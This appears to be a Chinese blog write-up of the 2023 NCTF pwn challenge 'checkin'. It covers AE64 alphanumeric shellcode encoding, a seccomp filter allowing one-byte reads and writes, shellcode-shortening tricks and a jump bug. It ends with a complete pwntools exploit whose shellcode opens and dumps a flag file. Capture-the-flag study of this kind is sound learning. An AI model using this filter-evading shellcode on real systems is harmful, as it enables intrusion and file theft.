@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2023 NCTF - PWN - 【checkin】（AE64、按位取反、填充长度以显示沙箱同时避免换行干扰、1 也是 write、缩短 shellcode 长度、bug、exp） · Y0uYuGe</title>
+<meta name="description" content="如果 jnz loop_write 后面没有指令，直接跟着 flag 的字符，就会莫名其妙地跳到一个奇怪的地方，但随便加一条指令比如 pop rax，跳转就正常了。read 每次读一个字节，write 也是。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20NCTF%20-%20PWN%20-%20%E3%80%90checkin%E3%80%91%EF%BC%88AE64%E3%80%81%E6%8C%89%E4%BD%8D%E5%8F%96%E5%8F%8D%E3%80%81%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%B2%99%E7%AE%B1%E5%90%8C%E6%97%B6%E9%81%BF" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2023">2023 年</a></nav>
+    <h1>2023 NCTF - PWN - 【checkin】（AE64、按位取反、填充长度以显示沙箱同时避免换行干扰、1 也是 write、缩短 shellcode 长度、bug、exp）</h1>
+    <div class="meta"><time>2024-03-13</time><span class="tag">#bug</span><span class="tag">#ctf pwn</span><span class="tag">#2023 nctf</span><span class="tag">#Pwn</span></div>
+    <article class="post-body">
+<h1 id="checkin-glibc-238">checkin glibc 2.38</h1>
+<h1 id="ae64">AE64</h1>
+<p><a href="https://github.com/veritas501/ae64">AE64</a></p>
+<blockquote>
+<p>AE64 is a tool which can transform any amd64 architecture shellcode into pure alphanumeric shellcode using self-modify code technology, so the page need to be writable.</p>
+</blockquote>
+<ul>
+<li>适用于 64 位</li>
+<li>原始 shellcode 允许包含空字节</li>
+<li>使用 ae64 生成时的参数传递</li>
+</ul>
+<pre><code class="language-python">obj=AE64()
+shellcode=(obj.encode(asm(shellcode),strategy=&quot;small&quot;,offset=0x34,register=&quot;rax&quot;))
+</code></pre>
+<ul>
+<li>第一个参数是 shellcode 的机器码，可以包含空字节</li>
+<li>第二个参数 small 表示生成尽可能短的 shellcode</li>
+<li>register 指的是这样一个寄存器：在该 shellcode 第一条指令即将执行时，它的值加上 offset 等于 shellcode 第一条指令的地址</li>
+</ul>
+<h1 id="shellcode-之前的十六进制反汇编">shellcode 之前的十六进制反汇编</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20NCTF%20-%20PWN%20-%20%E3%80%90checkin%E3%80%91%EF%BC%88AE64%E3%80%81%E6%8C%89%E4%BD%8D%E5%8F%96%E5%8F%8D%E3%80%81%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%B2%99%E7%AE%B1%E5%90%8C%E6%97%B6%E9%81%BF/assets/csdn-136635874/image-001-a41d4e29c4.png" alt="图片"></p>
+<h1 id="按位取反">按位取反</h1>
+<p>取反之后更容易理解</p>
+<pre><code class="language-c">    if ( (mmap_start_addr[i + 48] &lt;= &#39;`&#39; || mmap_start_addr[i + 48] &gt; &#39;z&#39;)
+      &amp;&amp; (mmap_start_addr[i + 48] &lt;= &#39;@&#39; || mmap_start_addr[i + 48] &gt; &#39;Z&#39;)
+      &amp;&amp; (mmap_start_addr[i + 48] &lt;= &#39;/&#39; || mmap_start_addr[i + 48] &gt; &#39;9&#39;)
+      &amp;&amp; mmap_start_addr[i + 48] != &#39;/&#39; )
+</code></pre>
+<h1 id="学到了几个单词-smile">学到了几个单词 :smile:</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20NCTF%20-%20PWN%20-%20%E3%80%90checkin%E3%80%91%EF%BC%88AE64%E3%80%81%E6%8C%89%E4%BD%8D%E5%8F%96%E5%8F%8D%E3%80%81%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%B2%99%E7%AE%B1%E5%90%8C%E6%97%B6%E9%81%BF/assets/csdn-136635874/image-002-fc72221b82.png" alt="图片"></p>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20NCTF%20-%20PWN%20-%20%E3%80%90checkin%E3%80%91%EF%BC%88AE64%E3%80%81%E6%8C%89%E4%BD%8D%E5%8F%96%E5%8F%8D%E3%80%81%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%B2%99%E7%AE%B1%E5%90%8C%E6%97%B6%E9%81%BF/assets/csdn-136635874/image-003-d28d996541.png" alt="图片"></p>
+<h1 id="填充长度以显示沙箱同时避免换行干扰">填充长度以显示沙箱同时避免换行干扰</h1>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20NCTF%20-%20PWN%20-%20%E3%80%90checkin%E3%80%91%EF%BC%88AE64%E3%80%81%E6%8C%89%E4%BD%8D%E5%8F%96%E5%8F%8D%E3%80%81%E5%A1%AB%E5%85%85%E9%95%BF%E5%BA%A6%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%B2%99%E7%AE%B1%E5%90%8C%E6%97%B6%E9%81%BF/assets/csdn-136635874/image-004-ade64f08fe.png" alt="图片"></p>
+<p>read 每次读一个字节，write 也是</p>
+<h1 id="1-也是-write">1 也是 write</h1>
+<pre><code class="language-bash">0014: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0020
+ 0015: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+ 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
+ 0017: 0x20 0x00 0x00 0x00000020  A = count # read(fd, buf, count)
+ 0018: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0020 
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0020: 0x15 0x00 0x05 0x00000001  if (A != 1) goto 0026 # write
+</code></pre>
+<h1 id="缩短-shellcode-长度">缩短 shellcode 长度</h1>
+<ul>
+<li>视情况可以不用 64 位寄存器，改用 32 位寄存器</li>
+<li>注意函数执行完后是否还有可以继续利用的寄存器，比如 read() 执行完后第三个参数保持不变，write 就可以直接使用</li>
+</ul>
+<h1 id="bug">Bug</h1>
+<p>如果 jnz loop_write 后面没有指令，直接跟着 flag 的字符，就会莫名其妙地跳到一个奇怪的地方，但随便加一条指令比如 pop rax，跳转就正常了</p>
+<h1 id="exp">exp</h1>
+<pre><code class="language-python">from pwn import *
+from ae64 import AE64
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+
+shellcode=&quot;&quot;&quot;
+push r9
+pop rdi
+push 2
+pop rax
+syscall 
+&quot;&quot;&quot;
+
+shellcode=&#39;&#39;&#39;
+
+xor edi, edi
+push 3 
+pop rax
+syscall
+
+mov rdi, 0x2023012c
+push 2 
+pop rax
+xor esi,esi
+xor edx,edx
+syscall
+   
+push rax
+pop rdi
+push 0x20230000
+pop rsi
+push 1
+pop rdx
+xor rax,rax
+xor r8,r8
+loop_read:
+syscall
+xor rax,rax
+inc r8
+inc rsi
+cmp r8,0x40
+jnz loop_read
+
+xor r8,r8
+push  1
+pop rax
+inc rdi
+push 0x20230000
+pop rsi
+push 1
+pop rdx
+
+loop_write:
+syscall
+inc r8
+inc rsi
+cmp r8,0x40
+jnz loop_write
+
+push rax  
+&#39;&#39;&#39;
+
+get_addr_call_shellcode=asm(
+&#39;&#39;&#39;
+pop rax
+pop rax
+pop rax
+pop rax
+&#39;&#39;&#39;)
+
+obj=AE64()
+shellcode=(obj.encode(asm(shellcode),strategy=&quot;small&quot;,offset=0x34,register=&quot;rax&quot;))
+s=process(&quot;./pwn_patched&quot;)
+print(len(shellcode))
+pause()
+#gdb.attach(s,&quot;b main&quot;)
+s.send(get_addr_call_shellcode+shellcode+b&quot;flag&quot;)
+s.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20N1CTF/"><span class="l">上一篇</span>2023 N1CTF</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2023/2023%20PWNHUB%20%E4%B8%89%E6%9C%88%E8%B5%9B/"><span class="l">下一篇</span>2023 PWNHUB 三月赛</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
